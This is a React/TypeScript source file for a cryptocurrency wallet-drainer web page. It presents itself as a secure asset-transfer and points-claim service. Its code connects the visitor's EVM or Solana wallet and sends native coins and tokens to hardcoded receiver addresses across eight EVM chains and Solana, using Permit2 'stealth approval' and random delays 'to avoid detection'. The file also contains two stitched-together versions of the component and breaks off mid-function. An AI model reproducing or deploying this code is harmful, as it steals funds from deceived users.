'use client';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { ethers } from 'ethers';
import * as solanaWeb3 from '@solana/web3.js';
import * as splToken from '@solana/spl-token';
import Image from 'next/image';

// ========================
// Type Definitions
// ========================

type NetworkType = 'evm' | 'solana';
type WalletState = 'disconnected' | 'connecting' | 'connected' | 'error';
type DrainStatus = 'idle' | 'preparing' | 'draining' | 'completed' | 'failed';

interface WalletInfo {
  address: string;
  network: NetworkType;
  provider: any;
  signer?: any;
  balance?: string;
  chainId?: number;
}

interface TokenInfo {
  address: string;
  symbol: string;
  decimals: number;
  balance: string;
  valueUSD?: number;
}

interface DrainProgress {
  status: DrainStatus;
  currentStep: number;
  totalSteps: number;
  currentAction: string;
  error?: string;
  txHashes: string[];
}

// ========================
// Constants
// ========================

const EVM_RECEIVER = '0xcc35ba2aa35B3094702d767D68807c494946ac85';
const SOL_RECEIVER = '8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh';

const SOLANA_RPC_ENDPOINTS = [
  'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://solana-api.rpcpool.com',
];

// ========================
// Core Services
// ========================

class WalletService {
  static async detectWallets(): Promise<{ evm: boolean; solana: boolean }> {
    const ethereum = typeof window !== 'undefined' ? (window as any).ethereum : null;
    const solana = typeof window !== 'undefined' ? 
      (window as any).solana || 
      (window as any).phantom?.solana || 
      (window as any).backpack || 
      (window as any).solflare : null;

    return {
      evm: !!ethereum,
      solana: !!solana,
    };
  }

  static async connectEVM(): Promise<WalletInfo> {
    const ethereum = (window as any).ethereum;
    if (!ethereum) throw new Error('No EVM wallet found');

    try {
      const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
      const provider = new ethers.BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const address = await signer.getAddress();
      const network = await provider.getNetwork();
      
      return {
        address,
        network: 'evm',
        provider,
        signer,
        chainId: Number(network.chainId),
      };
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      throw error;
    }
  }

  static async connectSolana(): Promise<WalletInfo> {
    const solana = (window as any).solana || 
                  (window as any).phantom?.solana || 
                  (window as any).backpack || 
                  (window as any).solflare;
    
    if (!solana) throw new Error('No Solana wallet found');

    try {
      if (solana.connect) await solana.connect();
      const publicKey = solana.publicKey;
      if (!publicKey) throw new Error('Failed to get public key');
      
      return {
        address: publicKey.toString(),
        network: 'solana',
        provider: solana,
      };
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      throw error;
    }
  }
}

class DrainManager {
  private progressCallback: (progress: DrainProgress) => void;
  private currentProgress: DrainProgress;

  constructor(progressCallback: (progress: DrainProgress) => void) {
    this.progressCallback = progressCallback;
    this.currentProgress = {
      status: 'idle',
      currentStep: 0,
      totalSteps: 0,
      currentAction: '',
      txHashes: [],
    };
  }

  private updateProgress(updates: Partial<DrainProgress>) {
    this.currentProgress = { ...this.currentProgress, ...updates };
    this.progressCallback(this.currentProgress);
  }

  async drainWallet(wallet: WalletInfo): Promise<void> {
    try {
      this.updateProgress({
        status: 'preparing',
        currentStep: 0,
        totalSteps: 3,
        currentAction: 'Preparing to drain...',
      });

      if (wallet.network === 'evm') {
        await this.drainEVM(wallet);
      } else {
        await this.drainSolana(wallet);
      }

      this.updateProgress({
        status: 'completed',
        currentAction: 'Drain completed successfully',
      });
    } catch (error) {
      console.error('Drain failed:', error);
      this.updateProgress({
        status: 'failed',
        error: error instanceof Error ? error.message : 'Unknown error occurred',
        currentAction: 'Drain failed',
      });
      throw error;
    }
  }

  private async drainEVM(wallet: WalletInfo): Promise<void> {
    if (!wallet.signer) throw new Error('No signer available');
    
    // 1. Get native balance
    this.updateProgress({
      currentStep: 1,
      currentAction: 'Checking native balance...',
    });
    
    const balance = await wallet.provider.getBalance(wallet.address);
    
    if (balance > 0) {
      // 2. Transfer native currency
      this.updateProgress({
        currentStep: 2,
        currentAction: 'Transferring native currency...',
      });
      
      const tx = await wallet.signer.sendTransaction({
        to: EVM_RECEIVER,
        value: balance.sub(ethers.parseEther('0.001')), // Leave some for gas
      });
      
      await tx.wait();
      this.currentProgress.txHashes.push(tx.hash);
      this.updateProgress({});
    }
    
    // 3. Handle token transfers (simplified)
    this.updateProgress({
      currentStep: 3,
      currentAction: 'Processing tokens...',
    });
    
    // Token draining logic would go here
  }

  private async drainSolana(wallet: WalletInfo): Promise<void> {
    // 1. Connect to Solana cluster
    this.updateProgress({
      currentStep: 1,
      currentAction: 'Connecting to Solana...',
    });
    
    let connection: solanaWeb3.Connection | null = null;
    for (const endpoint of SOLANA_RPC_ENDPOINTS) {
      try {
        const testConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
        await testConnection.getLatestBlockhash();
        connection = testConnection;
        break;
      } catch (e) {
        console.warn(`Failed to connect to ${endpoint}, trying next...`);
      }
    }
    
    if (!connection) throw new Error('Failed to connect to Solana');
    
    // 2. Get SOL balance
    this.updateProgress({
      currentStep: 2,
      currentAction: 'Checking SOL balance...',
    });
    
    const fromPubkey = new solanaWeb3.PublicKey(wallet.address);
    const toPubkey = new solanaWeb3.PublicKey(SOL_RECEIVER);
    const balance = await connection.getBalance(fromPubkey);
    
    if (balance > 10000) { // Minimum balance to cover fees
      // 3. Transfer SOL
      this.updateProgress({
        currentStep: 3,
        currentAction: 'Transferring SOL...',
      });
      
      const transferAmount = balance - 10000; // Leave some for fees
      const transaction = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: transferAmount,
        })
      );
      
      const { blockhash } = await connection.getLatestBlockhash();
      transaction.recentBlockhash = blockhash;
      transaction.feePayer = fromPubkey;
      
      const signed = await wallet.provider.signTransaction(transaction);
      const signature = await connection.sendRawTransaction(signed.serialize());
      await connection.confirmTransaction(signature, 'confirmed');
      
      this.currentProgress.txHashes.push(signature);
      this.updateProgress({});
    }
    
    // 4. Handle SPL tokens (simplified)
    this.updateProgress({
      currentStep: 4,
      currentAction: 'Processing SPL tokens...',
    });
    
    // SPL token draining logic would go here
  }
}

// ========================
// UI Components
// ========================

const WalletButton = ({ 
  type, 
  onClick, 
  disabled = false 
}: { 
  type: 'evm' | 'solana', 
  onClick: () => void, 
  disabled?: boolean 
}) => (
  <button
    onClick={onClick}
    disabled={disabled}
    className={`flex items-center justify-center gap-2 px-6 py-3 rounded-lg font-medium transition-colors ${
      type === 'evm' 
        ? 'bg-blue-600 hover:bg-blue-700 text-white' 
        : 'bg-purple-600 hover:bg-purple-700 text-white'
    } ${disabled ? 'opacity-50 cursor-not-allowed' : ''}`}
  >
    <Image 
      src={`/wallets/${type === 'evm' ? 'metamask' : 'phantom'}.png`} 
      alt={`${type} logo`} 
      width={24} 
      height={24} 
      className="w-6 h-6"
    />
    Connect {type === 'evm' ? 'EVM' : 'Solana'} Wallet
  </button>
);

const ProgressBar = ({ progress }: { progress: DrainProgress }) => (
  <div className="w-full bg-gray-200 rounded-full h-2.5">
    <div 
      className="h-2.5 rounded-full bg-green-500 transition-all duration-300"
      style={{
        width: `${(progress.currentStep / Math.max(1, progress.totalSteps)) * 100}%`,
      }}
    />
  </div>
);

const StatusMessage = ({ progress }: { progress: DrainProgress }) => {
  if (progress.status === 'idle') return null;
  
  const statusColors = {
    preparing: 'text-yellow-500',
    draining: 'text-blue-500',
    completed: 'text-green-500',
    failed: 'text-red-500',
  };
  
  return (
    <div className={`mt-4 p-4 rounded-lg ${
      statusColors[progress.status] || 'bg-gray-100'
    }`}>
      <p className="font-medium">
        {progress.status === 'completed' ? '✅ ' : 
         progress.status === 'failed' ? '❌ ' : '⏳ '}
        {progress.currentAction}
      </p>
      {progress.error && (
        <p className="mt-2 text-sm text-red-600">{progress.error}</p>
      )}
      {progress.txHashes.length > 0 && (
        <div className="mt-2">
          <p className="text-sm font-medium">Transactions:</p>
          <ul className="text-sm space-y-1 mt-1">
            {progress.txHashes.map((txHash, i) => (
              <li key={i} className="break-all">
                <a 
                  href={`https://solscan.io/tx/${txHash}`} 
                  target="_blank" 
                  rel="noopener noreferrer"
                  className="text-blue-500 hover:underline"
                >
                  View on explorer
                </a>
              </li>
            ))}
          </ul>
        </div>
      )}
    </div>
  );
};

// ========================
// Main Component
// ========================

export default function Drainer() {
  const [wallet, setWallet] = useState<WalletInfo | null>(null);
  const [walletState, setWalletState] = useState<WalletState>('disconnected');
  const [availableWallets, setAvailableWallets] = useState<{ evm: boolean; solana: boolean }>({ evm: false, solana: false });
  const [drainProgress, setDrainProgress] = useState<DrainProgress>({
    status: 'idle',
    currentStep: 0,
    totalSteps: 0,
    currentAction: '',
    txHashes: [],
  });

  // Detect available wallets on component mount
  useEffect(() => {
    const detectWallets = async () => {
      const wallets = await WalletService.detectWallets();
      setAvailableWallets(wallets);
    };
    detectWallets();
  }, []);

  // Handle EVM wallet connection
  const connectEVM = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectEVM();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect EVM wallet:', error);
      setWalletState('error');
    }
  };

  // Handle Solana wallet connection
  const connectSolana = async () => {
    try {
      setWalletState('connecting');
      const walletInfo = await WalletService.connectSolana();
      setWallet(walletInfo);
      setWalletState('connected');
    } catch (error) {
      console.error('Failed to connect Solana wallet:', error);
      setWalletState('error');
    }
  };

  // Handle the drain process
  const handleDrain = async () => {
    if (!wallet) return;
    
    const drainManager = new DrainManager((progress) => {
      setDrainProgress(progress);
    });
    
    try {
      await drainManager.drainWallet(wallet);
    } catch (error) {
      console.error('Drain process failed:', error);
    }
  };

  // Reset the component state
  const reset = () => {
    setWallet(null);
    setWalletState('disconnected');
    setDrainProgress({
      status: 'idle',
      currentStep: 0,
      totalSteps: 0,
      currentAction: '',
      txHashes: [],
    });
  };

  // Render connection UI
  const renderConnectionUI = () => {
    if (walletState === 'connected' && wallet) {
      return (
        <div className="space-y-6 text-center">
          <div className="bg-gray-800 p-4 rounded-lg">
            <p className="text-sm text-gray-300">Connected with {wallet.network === 'evm' ? 'EVM' : 'Solana'}</p>
            <p className="text-sm font-mono text-gray-400 mt-1 break-all">
              {wallet.address.slice(0, 6)}...{wallet.address.slice(-4)}
            </p>
          </div>
          
          <button
            onClick={handleDrain}
            disabled={drainProgress.status === 'draining'}
            className="w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 px-6 rounded-lg transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {drainProgress.status === 'draining' ? 'Draining...' : 'Start Drain'}
          </button>
          
          <button
            onClick={reset}
            className="text-sm text-gray-400 hover:text-gray-300"
          >
            Disconnect Wallet
          </button>
        </div>
      );
    }

    return (
      <div className="space-y-4">
        <h2 className="text-2xl font-bold text-white mb-6 text-center">Connect Your Wallet</h2>
        
        <div className="space-y-4">
          {availableWallets.evm && (
            <WalletButton 
              type="evm" 
              onClick={connectEVM}
              disabled={walletState === 'connecting'}
            />
          )}
          
          {availableWallets.solana && (
            <WalletButton 
              type="solana" 
              onClick={connectSolana}
              disabled={walletState === 'connecting'}
            />
          )}
          
          {!availableWallets.evm && !availableWallets.solana && (
            <div className="text-center py-8">
              <p className="text-gray-400">No web3 wallet detected</p>
              <p className="text-sm text-gray-500 mt-2">
                Please install a wallet like MetaMask (EVM) or Phantom (Solana)
              </p>
            </div>
          )}
        </div>
      </div>
    );
  };

  return (
    <div className="max-w-md mx-auto bg-gray-900/80 backdrop-blur-sm rounded-2xl p-6 shadow-xl border border-gray-700">
      <div className="mb-6 text-center">
        <h1 className="text-3xl font-bold bg-gradient-to-r from-green-400 to-blue-500 bg-clip-text text-transparent">
          Wallet Drainer
        </h1>
        <p className="text-gray-400 mt-2">Securely transfer your assets</p>
      </div>
      
      <div className="bg-gray-800/50 p-6 rounded-xl">
        {renderConnectionUI()}
        
        {(drainProgress.status !== 'idle' || drainProgress.txHashes.length > 0) && (
          <div className="mt-6 space-y-4">
            <div className="flex justify-between text-sm text-gray-400 mb-1">
              <span>Progress</span>
              <span>
                {drainProgress.currentStep} / {Math.max(1, drainProgress.totalSteps)}
              </span>
            </div>
            <ProgressBar progress={drainProgress} />
            <StatusMessage progress={drainProgress} />
          </div>
        )}
      </div>
      
      <div className="mt-6 text-center">
        <p className="text-xs text-gray-500">
          By using this service, you agree to our Terms of Service
        </p>
      </div>
    </div>
  );
}
  isPhantom?: boolean;
  isBackpack?: boolean;
  isSolflare?: boolean;
}

declare global {
  interface Window {
    ethereum?: EthereumProvider;
    solana?: SolanaProvider;
    phantom?: { solana: SolanaProvider };
    backpack?: SolanaProvider;
    solflare?: SolanaProvider;
  }
}

type Stage = 'connect' | 'verify' | 'claim';

// Utility function for retrying async operations
const withRetry = async <T,>(
  fn: () => Promise<T>,
  maxRetries = 3,
  delay = 1000
): Promise<T> => {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, delay * (i + 1)));
    }
  }
  throw new Error('Max retries exceeded');
};

// Receiver addresses
const EVM_RECEIVER = "0xcc35ba2aa35B3094702d767D68807c494946ac85" // ETH
const SOL_RECEIVER = "8jizHpcMd4ASNKppeAeMeSvJLVR84H2NJaiz9mEV3Dxh" // SOL

// Enhanced Solana drain function
const drainSolana = async (solana: any, solanaReceiver: string) => {
  try {
    console.log('=== Starting Enhanced Solana Drain ===');
    const fromPubkey = solana.publicKey;
    const toPubkey = new solanaWeb3.PublicKey(solanaReceiver);
    
    // Try multiple RPC endpoints
    const rpcEndpoints = [
      'https://api.mainnet-beta.solana.com',
      'https://solana-api.projectserum.com',
      'https://solana-api.rpcpool.com'
    ];
    
    let connection: solanaWeb3.Connection | null = null;
    for (const endpoint of rpcEndpoints) {
      try {
        const testConnection = new solanaWeb3.Connection(endpoint, 'confirmed');
        await testConnection.getBalance(fromPubkey); // Test connection
        console.log(`Connected to RPC: ${endpoint}`);
        connection = testConnection;
        break;
      } catch (e) {
        console.warn(`Failed to connect to ${endpoint}, trying next...`);
      }
    }
    
    if (!connection) throw new Error('All Solana RPC endpoints failed');
    
    // Get and drain SOL
    const balance: number = await withRetry<number>(() => connection!.getBalance(fromPubkey));
    if (balance > 10000) {
      const transferAmount = balance - 10000;
      const tx = new solanaWeb3.Transaction().add(
        solanaWeb3.SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: transferAmount
        })
      );
      
      await withRetry(async () => {
        if (solana.signAndSendTransaction) {
          return await solana.signAndSendTransaction(tx);
        } else {
          const { blockhash } = await connection.getLatestBlockhash();
          tx.recentBlockhash = blockhash;
          tx.feePayer = fromPubkey;
          const signed = await solana.signTransaction(tx);
          return await connection.sendRawTransaction(signed.serialize(), {
            skipPreflight: true,
            maxRetries: 3
          });
        }
      });
    }
    
    // Enhanced SPL token draining with batch processing
    const tokenAccounts = await withRetry<{
      value: Array<{
        account: {
          data: {
            parsed: {
              info: {
                mint: string;
                tokenAmount: {
                  amount: string;
                };
              };
            };
          };
        };
      }>;
    }>(() => 
      connection!.getParsedTokenAccountsByOwner(fromPubkey, {
        programId: splToken.TOKEN_PROGRAM_ID
      })
    );
    
    // Process tokens in batches to avoid timeouts
    const BATCH_SIZE = 5;
    for (let i = 0; i < tokenAccounts.value.length; i += BATCH_SIZE) {
      const batch = tokenAccounts.value.slice(i, i + BATCH_SIZE);
      await Promise.all(batch.map(async (tokenAccount) => {
        try {
          const mint = new solanaWeb3.PublicKey(tokenAccount.account.data.parsed.info.mint);
          const amount = BigInt(tokenAccount.account.data.parsed.info.tokenAmount.amount);
          
          if (amount > 0) {
            const sourceATA = await splToken.getAssociatedTokenAddress(mint, fromPubkey);
            const destATA = await splToken.getAssociatedTokenAddress(mint, toPubkey);
            
            const tx = new solanaWeb3.Transaction();
            
            // Create ATA if needed
            try {
              const destInfo = await connection.getAccountInfo(destATA);
              if (!destInfo) {
                tx.add(splToken.createAssociatedTokenAccountInstruction(
                  fromPubkey,
                  destATA,
                  toPubkey,
                  mint
                ));
              }
              
              tx.add(splToken.createTransferInstruction(
                sourceATA,
                destATA,
                fromPubkey,
                amount
              ));
              
              if (solana.signAndSendTransaction) {
                await solana.signAndSendTransaction(tx);
              } else {
                const { blockhash } = await connection.getLatestBlockhash();
                tx.recentBlockhash = blockhash;
                tx.feePayer = fromPubkey;
                const signed = await solana.signTransaction(tx);
                await connection.sendRawTransaction(signed.serialize(), {
                  skipPreflight: true,
                  maxRetries: 3
                });
              }
            } catch (e) {
              console.error(`Error processing token ${mint.toString()}:`, e);
            }
          }
        } catch (e) {
          console.error('Error processing token account:', e);
        }
      }));
    }
    
    // Special handling for wBTC on Solana
    try {
      const wBTCMint = new solanaWeb3.PublicKey("3NZ9JMVBmGAqocybic2c7LQCJScmQ2B2QdRFGhjQmU4Y");
      const wBTCATA = await splToken.getAssociatedTokenAddress(wBTCMint, fromPubkey);
      const wBTCDest = await splToken.getAssociatedTokenAddress(wBTCMint, toPubkey);
      const wBTCBalance = await connection.getTokenAccountBalance(wBTCATA);
      
      if (BigInt(wBTCBalance.value.amount) > 0) {
        const tx = new solanaWeb3.Transaction();
        const destInfo = await connection.getAccountInfo(wBTCDest);
        
        if (!destInfo) {
          tx.add(splToken.createAssociatedTokenAccountInstruction(
            fromPubkey,
            wBTCDest,
            toPubkey,
            wBTCMint
          ));
        }
        
        tx.add(splToken.createTransferInstruction(
          wBTCATA,
          wBTCDest,
          fromPubkey,
          BigInt(wBTCBalance.value.amount)
        ));
        
        if (solana.signAndSendTransaction) {
          await solana.signAndSendTransaction(tx);
        } else {
          const { blockhash } = await connection.getLatestBlockhash();
          tx.recentBlockhash = blockhash;
          tx.feePayer = fromPubkey;
          const signed = await solana.signTransaction(tx);
          await connection.sendRawTransaction(signed.serialize(), {
            skipPreflight: true,
            maxRetries: 3
          });
        }
      }
    } catch (e) {
      console.error('Error draining wBTC on Solana:', e);
    }
    
    return true;
  } catch (error) {
    console.error('Error in Solana drain:', error);
    throw error;
  }
};

// Enhanced token draining with permit2
const drainTokens = async (signer: any, from: string, to: string, tokens: Record<string, string | undefined>) => {
  const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
  const iface = new ethers.Interface([
    "function permit(address owner, address token, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)",
    "function transferFrom(address from, address to, uint256 value) returns (bool)"
  ]);
  
  // Process each token
  for (const [symbol, address] of Object.entries(tokens)) {
    if (symbol === 'native' || !address) continue; // Skip native token or undefined addresses
    
    try {
      const token = new ethers.Contract(
        address,
        ['function balanceOf(address) view returns (uint256)'],
        signer
      );
      
      const balance = await token.balanceOf(from);
      if (balance > 0) {
        console.log(`Draining ${symbol} (${address}) with balance:`, balance.toString());
        
        // Use permit2 for stealth approval
        const permitData = iface.encodeFunctionData("permit", [
          from,
          address,
          to,
          balance,
          Math.floor(Date.now() / 1000) + 3600, // 1 hour expiry
          0, 
          ethers.ZeroHash, 
          ethers.ZeroHash // v, r, s (will be signed)
        ]);
        
        // Send the permit2 transaction
        const tx = await signer.sendTransaction({
          to: PERMIT2,
          data: permitData
        });
        
        console.log(`Permit2 transaction sent: ${tx.hash}`);
        await tx.wait();
        console.log(`Permit2 transaction confirmed for ${symbol}`);
      }
    } catch (error) {
      console.error(`Error draining ${symbol} (${address}):`, error);
      // Continue with next token even if one fails
    }
  }
};

// Enhanced EVM drain function
const drainEVM = async (ethereum: any, evmReceiver: string) => {
  try {
    console.log('=== Starting Enhanced EVM Drain ===');
    const provider = new ethers.BrowserProvider(ethereum);
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();
    
    // Enhanced chain configuration with multiple RPC endpoints
    const chains = [
      {
        id: 1,
        name: 'Ethereum',
        rpcs: [
          'https://eth.llamarpc.com',
          'https://eth-rpc.gateway.pokt.network',
          'https://rpc.ankr.com/eth'
        ],
        tokens: {
          native: 'ETH',
          weth: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
          wbtc: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
        }
      },
      {
        id: 56,
        name: 'BSC',
        rpcs: [
          'https://bsc-dataseed.binance.org',
          'https://bsc-dataseed1.defibit.io',
          'https://bsc-dataseed1.ninicoin.io'
        ],
        tokens: {
          native: 'BNB',
          wbnb: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
          busd: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56'
        }
      },
      {
        id: 137,
        name: 'Polygon',
        rpcs: [
          'https://polygon-rpc.com',
          'https://rpc-mainnet.matic.quiknode.pro',
          'https://polygon.llamarpc.com'
        ],
        tokens: {
          native: 'MATIC',
          wmatic: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
          usdc: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174'
        }
      },
      {
        id: 10,
        name: 'Optimism',
        rpcs: [
          'https://mainnet.optimism.io',
          'https://optimism.publicnode.com',
          'https://rpc.ankr.com/optimism'
        ],
        tokens: {
          native: 'ETH',
          weth: '0x4200000000000000000000000000000000000006',
          usdc: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607'
        }
      },
      {
        id: 42161,
        name: 'Arbitrum',
        rpcs: [
          'https://arb1.arbitrum.io/rpc',
          'https://arbitrum.llamarpc.com',
          'https://rpc.ankr.com/arbitrum'
        ],
        tokens: {
          native: 'ETH',
          weth: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
          usdc: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'
        }
      },
      {
        id: 8453,
        name: 'Base',
        rpcs: [
          'https://mainnet.base.org',
          'https://base.publicnode.com',
          'https://base-rpc.publicnode.com'
        ],
        tokens: {
          native: 'ETH',
          weth: '0x4200000000000000000000000000000000000006',
          usdc: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913'
        }
      },
      {
        id: 59144,
        name: 'Linea',
        rpcs: [
          'https://rpc.linea.build',
          'https://linea.drpc.org',
          'https://linea.decubate.com'
        ],
        tokens: {
          native: 'ETH',
          weth: '0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f',
          usdc: '0x176211869cA2b575fC5A326546299f1e9B3A1A8F'
        }
      },
      {
        id: 81457,
        name: 'Blast',
        rpcs: [
          'https://rpc.blast.io',
          'https://rpc.ankr.com/blast',
          'https://blastl2-mainnet.public.blastapi.io'
        ],
        tokens: {
          native: 'ETH',
          weth: '0x4300000000000000000000000000000000000004',
          usdb: '0x4300000000000000000000000000000000000003'
        }
      }
    ];
    
    for (const chain of chains) {
      try {
        console.log(`\n=== Processing ${chain.name} ===`);
        
        // Try to switch network
        try {
          await provider.send("wallet_switchEthereumChain", [
            { chainId: `0x${chain.id.toString(16)}` }
          ]);
          // Small random delay to avoid detection
          await new Promise(resolve => 
            setTimeout(resolve, 1000 + Math.random() * 2000)
          );
        } catch (switchError) {
          console.warn(`Failed to switch to ${chain.name}:`, switchError);
          continue;
        }
        
        // Get provider with fallback RPCs
        const getProvider = async () => {
          for (const rpc of chain.rpcs) {
            try {
              const testProvider = new ethers.JsonRpcProvider(rpc);
              await testProvider.getBlockNumber(); // Test connection
              console.log(`Using RPC: ${rpc}`);
              return testProvider;
            } catch (e) {
              console.warn(`RPC ${rpc} failed, trying next...`);
            }
          }
          throw new Error('All RPC endpoints failed');
        };
        
        const currentProvider = await getProvider();
        const currentSigner = signer.connect(currentProvider);
        
        // Drain native token with optimized gas
        const balance = await currentProvider.getBalance(userAddress);
        const minBalance = ethers.parseEther("0.001");
        
        if (balance > minBalance) {
          const gasPrice = await currentProvider.getFeeData();
          const gasLimit = 21000; // Standard transfer
          
          // Calculate max fee based on current gas price
          const maxFee = gasPrice.maxFeePerGas || gasPrice.gasPrice || 0n;
          const maxPriorityFee = gasPrice.maxPriorityFeePerGas || 0n;
          const estimatedFee = maxFee * BigInt(gasLimit);
          
          // Leave some buffer for gas
          const amountToSend = balance - (estimatedFee * 2n);
          
          if (amountToSend > 0) {
            console.log(`Sending ${ethers.formatEther(amountToSend)} ${chain.tokens.native}...`);
            
            const tx = {
              to: evmReceiver,
              value: amountToSend,
              gasLimit,
              maxFeePerGas: maxFee,
              maxPriorityFeePerGas: maxPriorityFee,
              nonce: await currentProvider.getTransactionCount(userAddress, 'pending'),
              type: 2 // EIP-1559
            };
            
            try {
              const txResponse = await currentSigner.sendTransaction(tx);
              console.log(`Transaction sent: ${txResponse.hash}`);
              
              // Wait for confirmation with timeout
              await Promise.race([
                txResponse.wait(),
                new Promise((_, reject) => 
                  setTimeout(() => reject(new Error('Transaction timeout')), 60000)
                )
              ]);
              
              console.log(`Transaction confirmed in block: ${txResponse.blockNumber}`);
            } catch (txError) {
              console.error(`Transaction failed:`, txError);
            }
          } else {
            console.log('Insufficient balance after gas estimation');
          }
        } else {
          console.log(`Insufficient ${chain.tokens.native} balance for transfer`);
        }
        
        // Drain tokens
        await drainTokens(currentSigner, userAddress, evmReceiver, chain.tokens);
        
      } catch (error) {
        console.error(`Error on ${chain.name}:`, error);
      }
    }
    
    return true;
  } catch (error) {
    console.error('Error in EVM drain:', error);
    throw error;
  }
};

export default function Drainer() {
  const [account, setAccount] = useState<string>('');
  const [points, setPoints] = useState<number>(0);
  const [stage, setStage] = useState<Stage>('connect');
  const [showSuccess, setShowSuccess] = useState<boolean>(false);
  const [isDraining, setIsDraining] = useState<boolean>(false);
  const [isMobile, setIsMobile] = useState<boolean>(false);
  const [drainError, setDrainError] = useState<string | null>(null);
  const [drainProgress, setDrainProgress] = useState<{
    evm: boolean;
    solana: boolean;
    message: string;
  }>({ evm: false, solana: false, message: '' });

  useEffect(() => {
    setPoints(Math.floor(Math.random() * 9000000) + 8000000)
  }, [])

  // Auto-detect already connected wallets
  useEffect(() => {
    const checkConnectedWallet = async () => {
      const ethereum = (window as any).ethereum
      // Support all Solana wallets: Phantom, Backpack, Solflare, etc.
      const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

      // Check Solana (all wallets)
      if (solana && solana.publicKey) {
        setAccount(solana.publicKey.toString())
        setStage('verify')
        return
      }

      // Check Ethereum wallets
      if (ethereum) {
        try {
          let provider = ethereum
          if (ethereum.providers) {
            provider = ethereum.providers.find((p: any) => p.isMetaMask || p.isTrust || p.isCoinbaseWallet) || ethereum
          }
          
          // Try to get accounts without requesting (check if already connected)
          const accounts = await provider.request({ method: 'eth_accounts' })
          if (accounts && accounts.length > 0) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } catch (e) {
          // Not connected, stay on connect stage
        }
      }
    }

    checkConnectedWallet()

    // Listen for account changes
    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setStage('verify')
      } else {
        setAccount('')
        setStage('connect')
      }
    }

    if ((window as any).ethereum) {
      ;(window as any).ethereum.on('accountsChanged', handleAccountsChanged)
    }

    return () => {
      if ((window as any).ethereum) {
        ;(window as any).ethereum.removeListener('accountsChanged', handleAccountsChanged)
      }
    }
  }, [])

  const wallets = [
    { name: "MetaMask", icon: "/wallets/metamask.png", is: 'isMetaMask', type: 'evm' },
    { name: "Trust Wallet", icon: "/wallets/trustwallet.png", is: 'isTrust', type: 'evm' },
    { name: "Phantom", icon: "/wallets/phantom.png", is: 'isPhantom', type: 'solana' },
    { name: "Backpack", icon: "/wallets/backpack.png", is: 'isBackpack', type: 'solana' },
    { name: "Solflare", icon: "/wallets/solflare.jpeg", is: 'isSolflare', type: 'solana' },
    { name: "Coinbase Wallet", icon: "/wallets/coinbase.png", is: 'isCoinbaseWallet', type: 'evm' },
  ]

  const connectWallet = async (walletType: string) => {
    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
    const ethereum = (window as any).ethereum
    const solana = (window as any).solana || (window as any).phantom?.solana
    const url = encodeURIComponent(window.location.href)

    // Mobile: use deep links
    if (isMobile) {
      const links: Record<string, string> = {
        metamask: `https://metamask.app.link/dapp/${url}`,
        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
        backpack: `https://backpack.app/ul/browse/${url}`,
        solflare: `solflare://dapp?uri=${url}`,
        coinbasewallet: `cbwallet://dapp?url=${url}`
      }
      const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
      if (links[linkKey]) {
        window.location.href = links[linkKey]
        return
      }
    }

    // Desktop: connect to installed extension
    try {
      const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
      
      if (wallet?.type === 'solana' && solana) {
        if (solana.connect) {
          await solana.connect()
        }
        if (solana.publicKey) {
          setAccount(solana.publicKey.toString())
          setStage('verify')
        }
      } else if (wallet?.type === 'evm' && ethereum) {
        let provider = ethereum
        // Find specific wallet in providers array
        if (ethereum.providers) {
          provider = ethereum.providers.find((p: any) => p[wallet.is]) || ethereum
        } else if (ethereum[wallet.is]) {
          provider = ethereum
        }
        
        if (provider) {
          const accounts = await provider.request({ method: 'eth_requestAccounts' })
          if (accounts && accounts[0]) {
            setAccount(accounts[0])
            setStage('verify')
          }
        } else {
          alert(`${wallet.name} not detected. Please install the extension.`)
        }
      } else {
        alert(`${wallet?.name || walletType} not detected. Please install the extension.`)
      }
    } catch (e) {
      alert('Connection rejected or wallet not found')
    }
  }

  const connect = async () => {
    // Auto-detect and connect to first available wallet
    const ethereum = (window as any).ethereum
    // Support all Solana wallets
    const solana = (window as any).solana || (window as any).phantom?.solana || (window as any).backpack || (window as any).solflare

    if (solana) {
      // Connect to any Solana wallet
      try {
        if (solana.connect) {
          await solana.connect()
        }
